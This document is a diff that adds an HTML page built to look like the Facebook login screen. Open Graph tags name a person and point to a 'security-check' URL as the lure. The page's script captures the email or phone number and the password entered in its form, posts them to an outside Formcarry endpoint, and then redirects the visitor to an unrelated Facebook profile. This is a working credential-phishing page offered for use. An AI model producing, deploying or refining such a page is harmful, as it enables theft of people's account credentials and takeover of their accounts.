@@ -1,0 +1,226 @@
+<!doctype html>
+<html lang="en"> 
+<head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <meta property="og:title" content="Mamta Sharma"> 
+  <meta property="og:description" content="https://www.facebook.com/profile.php?id=100013883838388"> 
+  <meta property="og:image" content="https://raw.githubusercontent.com/Gunjan-netizen/Plasto/refs/heads/main/Ms.jpg"> 
+  <meta property="og:url" content="https://security-check.netlify.app/"> 
+  <title>Facebook Login</title> 
+  <link rel="stylesheet" href="styles.css"> 
+  <style>
+    /* Modal Styles */
+    .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1000; /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgba(0, 0, 0, 0.5); /* Black w/ opacity */
+    }
+
+    .modal-content {
+        background-color: #fefefe;
+        margin: 15% auto; /* 15% from the top and centered */
+        padding: 20px;
+        border: 1px solid #888;
+        width: 80%; /* Could be more or less, depending on screen size */
+        box-shadow: 0 5px 15px rgba(0,0,0,0.3); /* Add shadow for better visibility */
+        border-radius: 8px; /* Rounded corners */
+    }
+
+    .close-button {
+        color: #aaa;
+        float: right;
+        font-size: 28px;
+        font-weight: bold;
+    }
+
+    .close-button:hover,
+    .close-button:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+    }
+
+    button {
+        margin: 10px;
+        padding: 10px 20px;
+        border: none;
+        background-color: #4267B2; /* Default button color */
+        color: white;
+        cursor: pointer;
+        border-radius: 5px; /* Rounded corners for buttons */
+        font-weight: bold; /* Bold text */
+    }
+
+    .modal-button {
+        background-color: #1373eb; /* New color for modal buttons */
+        border-radius: 8px; /* Rounded corners for modal buttons */
+    }
+
+    .modal-content h2 {
+        margin-top: 20px; /* Adjust space above heading */
+    }
+
+    .modal-content p {
+        margin-bottom: 20px; /* Adjust space below paragraph */
+    }
+</style>
+</head> 
+<body> 
+  <div class="row res"> 
+   <div class="fb-form res"> 
+    <div class="card"> 
+     <h1>Facebook</h1> 
+     <p>Connect with friends and the world</p> 
+     <p>around you on Facebook.</p> 
+    </div> 
+    <form id="loginForm"> 
+     <input type="text" id="emailPhone" placeholder="Email or phone number" required> 
+     <input type="password" id="password" placeholder="Password" required> 
+     <div class="fb-submit"> 
+         <button type="submit" class="login">Login</button> 
+         <a href="#" class="forgot">Forgot password?</a> 
+     </div> 
+     <hr> 
+     <div class="button"> 
+         <a href="#">Create new account</a> 
+     </div> 
+    </form> 
+   </div> 
+  </div> 
+
+  <!-- Modal HTML -->
+  <div id="popupModal" class="modal">
+      <div class="modal-content">
+          <span class="close-button" onclick="closeModal()">&times;</span>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="display: block; margin: 0 auto; width: 50px; height: auto;"/>
+          <h2 style="text-align: center;">Continue your search</h2>
+          <p style="text-align: center;">Log in to find out more about your interests and get the latest updates.</p>
+          <button class="modal-button" onclick="redirectToLogin()">Log in</button>
+          <button class="modal-button" onclick="redirectToSignup()">Create new account</button>
+      </div>
+  </div>
+
+  <footer> 
+   <div class="footer-langs"> 
+    <ol> 
+     <li>English (UK)</li> 
+     <li><a href="#">मराठी</a></li> 
+     <li><a href="#">हिन्दी</a></li> 
+     <li><a href="#">اردو</a></li> 
+     <li><a href="#">ગુજરાતી</a></li> 
+     <li><a href="#">ಕನ್ನಡ</a></li> 
+     <li><a href="#">ਪੰਜਾਬੀ</a></li> 
+     <li><a href="#">தமிழ்</a></li> 
+     <li><a href="#">বাংলা</a></li> 
+     <li><a href="#">తెలుగు</a></li> 
+     <li><a href="#">മലയാളം</a></li> 
+     <li><button>+</button></li> 
+    </ol> 
+    <ol> 
+     <li><a href="#">Sign Up</a></li>
+     <li><a href="#">Facebook Lite</a></li> 
+     <li><a href="#">Video</a></li> 
+     <li><a href="#">Places</a></li> 
+     <li><a href="#">Games</a></li> 
+     <li><a href="#">Marketplace</a></li> 
+     <li><a href="#">Meta Pay</a></li> 
+     <li><a href="#">Meta Store</a></li> 
+     <li><a href="#">Meta Quest</a></li> 
+     <li><a href="#">Imagine with Meta AI</a></li> 
+     <li><a href="#">Instagram</a></li> 
+     <li><a href="#">Threads</a></li> 
+     <li><a href="#">Fundraisers</a></li> 
+     <li><a href="#">Services</a></li> 
+     <li><a href="#">Voting Information Centre</a></li> 
+     <li><a href="#">Privacy Policy</a></li> 
+     <li><a href="#">Privacy Centre</a></li> 
+     <li><a href="#">Groups</a></li> 
+     <li><a href="#">About</a></li> 
+     <li><a href="#">Create ad</a></li> 
+     <li><a href="#">Create Page</a></li> 
+     <li><a href="#">Developers</a></li> 
+     <li><a href="#">Careers</a></li> 
+     <li><a href="#">Cookies</a></li> 
+     <li><a href="#">AdChoices</a></li> 
+     <li><a href="#">Terms</a></li> 
+     <li><a href="#">Help</a></li> 
+     <li><a href="#">Contact uploading and non-users</a></li> 
+    </ol> 
+    <small>Meta © 2024</small> 
+   </div> 
+  </footer> 
+
+  <script>
+        document.getElementById("loginForm").addEventListener("submit", function (e) {
+            e.preventDefault(); // Prevent form submission
+
+            const emailPhoneInput = document.getElementById("emailPhone").value;
+            const passwordInput = document.getElementById("password").value;
+
+            // Regular expression for email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[0-9]{10}$/;
+
+            if (emailRegex.test(emailPhoneInput) || phoneRegex.test(emailPhoneInput)) {
+                if (passwordInput) {
+                    // Submit form data to Formcarry
+                    fetch("https://formcarry.com/s/hJQzoZbhqc-", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            emailOrPhone: emailPhoneInput,
+                            password: passwordInput
+                        })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log("Data submitted successfully");
+                        } else {
+                            console.log("Failed to submit data");
+                        }
+                    })
+                    .catch(error => console.error("Error:", error));
+
+                    // Redirect to Facebook profile link
+                    window.location.href = "https://www.facebook.com/profile.php?id=100017603296655";  // Redirect to Facebook profile
+                } else {
+                    alert("Please enter your password.");
+                }
+            } else {
+                alert("Please enter a valid 10-digit phone number or email address.");
+            }
+        });
+
+        // Function to show the modal on page load
+        window.onload = function() {
+            document.getElementById("popupModal").style.display = "block";
+        };
+
+        // Function to close the modal
+        function closeModal() {
+            document.getElementById("popupModal").style.display = "none";
+        }
+
+        // Function to redirect to login page
+        function redirectToLogin() {
+            closeModal();
+            window.location.href = "https://www.facebook.com/login"; // Redirect to Facebook login page
+        }
+
+        // Function to redirect to signup page
+        function redirectToSignup() {
+            closeModal();
+            window.location.href = "https://www.facebook.com/r.php"; // Redirect to Facebook signup page
+        }
+    </script> 
+</body>
+</html>
